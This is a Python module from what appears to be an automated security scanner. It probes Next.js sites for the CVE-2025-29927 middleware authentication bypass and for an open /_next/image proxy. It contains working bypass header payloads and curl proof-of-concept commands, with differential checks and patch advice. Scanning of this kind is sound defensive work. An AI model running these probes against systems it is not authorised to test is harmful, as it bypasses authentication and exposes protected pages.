"""nextjs_probe — teknik manual agent (2026-09-08) yang dipromosikan ke engine.

Dua kelas serangan framework-specific yang tidak dimiliki engine lain, keduanya
diferensial 3-gate (truth-guarantee) dan di-gate bukti Next.js di world model:

1. middleware_bypass  - CVE-2025-29927: header x-middleware-subrequest membuat
   Next.js menjalankan middleware sebagai subrequest sehingga proteksi auth
   dilewati. Gate: baseline tertahan -> kontrol (header bogus) tetap tertahan ->
   hanya varian asli yang membuka protected path = temuan.
2. next_image_proxy   - /_next/image mengambil URL eksternal milik attacker =
   origin menjadi content proxy (primitif SSRF terbatas). Gate: URL eksternal
   200 + content-type image/* sementara kontrol URL sampah non-200.
"""

from __future__ import annotations

from urllib.parse import quote, urlsplit

from . import http_engine
from .base import Tool, ToolContext, ToolResult
from ..findings import Finding

_MW_VARIANTS = (
    "middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "pages/_middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
)
_PROTECTED_DEFAULTS = ("/dashboard", "/admin", "/profile", "/settings", "/app")


def _has_nextjs_evidence(ctx: ToolContext) -> bool:
    """FP-guard: engine hanya jalan bila ada bukti Next.js di world model
    (aset /_next/ teramati crawler ATAU fingerprint tech), bukan asumsi."""
    if any("/_next/" in urlsplit(e.url).path
           for e in ctx.world.endpoints.values()):
        return True
    return ctx.world.has_tech("next")


def _hdr(headers: dict, name: str) -> str:
    for k, v in (headers or {}).items():
        if k.lower() == name.lower():
            return v
    return ""


class MiddlewareBypassTool(Tool):
    name = "middleware_bypass"
    description = ("CVE-2025-29927: bypass middleware Next.js via "
                   "x-middleware-subrequest (diferensial 3-gate, bukti Next.js "
                   "wajib dari world model).")
    risk_tags = {"active", "external"}
    source_skill = "agent-manual-2026-09"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        base = str(args["url"]).rstrip("/")
        if not _has_nextjs_evidence(ctx):
            ctx.world.note("middleware_bypass: tidak ada bukti Next.js - dilewati")
            return ToolResult(tool=self.name, ok=True,
                              data={"skipped": "no-nextjs-evidence"})
        paths: list[str] = []
        for e in sorted(ctx.world.endpoints.values(), key=lambda x: x.url):
            st = e.status or 0
            p = urlsplit(e.url).path
            if st in (301, 302, 307, 308, 401, 403) and p and p != "/" and p not in paths:
                paths.append(p)
        for p in _PROTECTED_DEFAULTS:
            if len(paths) >= 4:
                break
            if p not in paths:
                paths.append(p)
        paths = paths[:4]
        checked = 0
        hits: list[tuple[str, str, int]] = []
        for path in paths:
            try:
                ctx.throttle()
                b_st, _bh, b_body, _m = http_engine.http_get(
                    base + path, timeout=ctx.timeout_s, follow_redirects=False)
            except Exception:
                continue
            ctx.world.request_count += 1
            checked += 1
            if not isinstance(b_st, int) or b_st == 200 or b_st >= 500:
                continue  # gate 1: path tidak terproteksi -> bukan target uji
            try:
                ctx.throttle()
                c_st, _ch, _cb, _m2 = http_engine.http_get(
                    base + path, timeout=ctx.timeout_s,
                    headers={"x-middleware-subrequest": "bogus:value"},
                    follow_redirects=False)
            except Exception:
                continue
            ctx.world.request_count += 1
            checked += 1
            if c_st != b_st:
                continue  # gate 2: server bereaksi ke header sembarangan
            hit = None
            for variant in _MW_VARIANTS:
                try:
                    ctx.throttle()
                    a_st, _ah, a_body, _m3 = http_engine.http_get(
                        base + path, timeout=ctx.timeout_s,
                        headers={"x-middleware-subrequest": variant},
                        follow_redirects=False)
                except Exception:
                    continue
                ctx.world.request_count += 1
                checked += 1
                if (a_st == 200 and a_body and a_body != b_body
                        and len(a_body) > 200):
                    hit = variant
                    break
            if hit:
                hits.append((path, hit, b_st))
        findings: list[Finding] = []
        for path, variant, b_st in hits:
            findings.append(Finding(
                tool=self.name,
                title=f"Next.js middleware bypass (CVE-2025-29927) pada {path}",
                severity="high", cwe="CWE-285",
                description=(f"Protected path {path} tertahan pada baseline "
                             f"(status {b_st}) dan tetap tertahan saat kontrol "
                             f"header sembarangan, TETAPI terbuka (200) saat "
                             f"header x-middleware-subrequest: {variant!r}. Tiga "
                             f"gate terpenuhi -> bypass middleware terkonfirmasi; "
                             f"proteksi auth di middleware bisa dilewati tanpa "
                             f"otentikasi."),
                recommendation=("Perbarui Next.js ke versi yang sudah mem-patch "
                                "CVE-2025-29927 (>= 14.2.25 / 15.2.3), dan jangan "
                                "jadikan middleware satu-satunya gate otorisasi: "
                                "verifikasi sesi juga di level route/handler."),
                target_url=base + path,
                request=f"GET {path} dengan header x-middleware-subrequest",
                response=(f"baseline={b_st}; kontrol(bogus)={b_st}; "
                          f"attack(variant)=200, body berbeda"),
                poc=(f"curl -i '{base}{path}' -H "
                     f"'x-middleware-subrequest: {variant}'"),
                confidence=0.9, source_skill=self.source_skill,
                status="confirmed", evidence_kind="probe-pair",
                finding_class="exploitable"))
        ctx.world.note(f"middleware_bypass: {checked} request pada {len(paths)} "
                       f"path kandidat, {len(findings)} bypass")
        return ToolResult(tool=self.name, ok=True,
                          data={"checked": checked, "paths": paths},
                          findings=findings)


class NextImageProxyTool(Tool):
    name = "next_image_proxy"
    description = ("/_next/image open-proxy: origin mengambil URL eksternal yang "
                   "dipilih attacker (content proxy, primitif SSRF terbatas).")
    risk_tags = {"active"}
    source_skill = "agent-manual-2026-09"

    EXT = "https://www.google.com/favicon.ico"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        base = str(args["url"]).rstrip("/")
        if not _has_nextjs_evidence(ctx):
            ctx.world.note("next_image_proxy: tidak ada bukti Next.js - dilewati")
            return ToolResult(tool=self.name, ok=True,
                              data={"skipped": "no-nextjs-evidence"})
        ext = quote(self.EXT, safe="")
        try:
            ctx.throttle()
            a_st, a_h, a_body, _m = http_engine.http_get(
                f"{base}/_next/image?url={ext}&w=640&q=75",
                timeout=ctx.timeout_s, follow_redirects=False)
        except Exception as exc:
            ctx.world.note(f"next_image_proxy: error attack request "
                           f"({type(exc).__name__})")
            return ToolResult(tool=self.name, ok=True,
                              data={"error": type(exc).__name__})
        ctx.world.request_count += 1
        try:
            ctx.throttle()
            c_st, _ch, _cb, _m2 = http_engine.http_get(
                f"{base}/_next/image?url=%00invalid&w=640&q=75",
                timeout=ctx.timeout_s, follow_redirects=False)
        except Exception:
            c_st = None
        ctx.world.request_count += 1
        ctype = _hdr(a_h, "Content-Type")
        findings: list[Finding] = []
        if a_st == 200 and ctype.lower().startswith("image/") and c_st != 200:
            findings.append(Finding(
                tool=self.name,
                title="Next.js Image Optimizer menjadi content proxy "
                      "(ambil URL eksternal)",
                severity="medium", cwe="CWE-918",
                description=(f"/_next/image menerima URL eksternal "
                             f"({self.EXT}) dan mengembalikan isinya dengan "
                             f"content-type {ctype} (status {a_st}), sementara "
                             f"kontrol URL tidak valid ditolak (status {c_st}). "
                             f"Origin dapat dijadikan proxy untuk mengambil "
                             f"kontekstual URL pihak ketiga - primitif SSRF "
                             f"terbatas dari sisi server. Bukti diferensial "
                             f"request-response, bukan asumsi."),
                recommendation=("Batasi images.remotePatterns pada next.config ke "
                                "domain yang benar-benar dipakai, dan matikan "
                                "fetch URL eksternal yang tidak diperlukan."),
                target_url=f"{base}/_next/image",
                request=f"GET /_next/image?url={self.EXT}&w=640&q=75",
                response=f"attack=200 content-type={ctype}; kontrol={c_st}",
                poc=f"curl -i '{base}/_next/image?url={self.EXT}&w=640&q=75'",
                confidence=0.85, source_skill=self.source_skill,
                status="confirmed", evidence_kind="request-response",
                finding_class="exploitable"))
        ctx.world.note(f"next_image_proxy: attack={a_st} ({ctype or 'tanpa ctype'}), "
                       f"kontrol={c_st}, {len(findings)} temuan")
        return ToolResult(tool=self.name, ok=True,
                          data={"attack": a_st, "ctype": ctype, "control": c_st},
                          findings=findings)
